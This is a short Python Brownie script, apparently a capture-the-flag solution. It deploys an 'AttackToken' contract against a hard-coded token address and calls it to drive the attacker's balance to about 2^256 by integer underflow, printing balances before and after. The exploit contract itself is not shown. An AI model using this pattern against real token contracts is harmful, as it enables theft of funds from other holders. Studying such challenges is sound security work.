from brownie import accounts,config,network,interface, AttackToken

def main():
    network.priority_fee("5 gwei")
    contract = '0x084e58f25AAe6cf23256308713D7a4d0Ac188DC6'
    player = accounts.add(config['wallets']['from_key'])

    AttackToken_instance = AttackToken.deploy(contract,{'from':player})

    itoken_interface = interface.IToken(contract)
    balance = itoken_interface.balanceOf(player)
    attackcontract_balance = itoken_interface.balanceOf(AttackToken_instance.address)
    total = itoken_interface.totalSupply()

    print('Player balance: ',balance)
    print('Attack Address balance: ',attackcontract_balance)
    print('Contract\'s balance: ', total)

    AttackToken_instance.transfer(player,{'from':player})

    # Have to sent transaction again to get latest update

    balance = itoken_interface.balanceOf(player)
    attackcontract_balance = itoken_interface.balanceOf(AttackToken_instance.address)
    total = itoken_interface.totalSupply()

    print('Player balance: ',balance)
    print('Attack Address balance: ',attackcontract_balance)
    # maximum value of 2^256-1000000 =  attackcontract_balance
    
    print('Contract\'s balance: ', total)



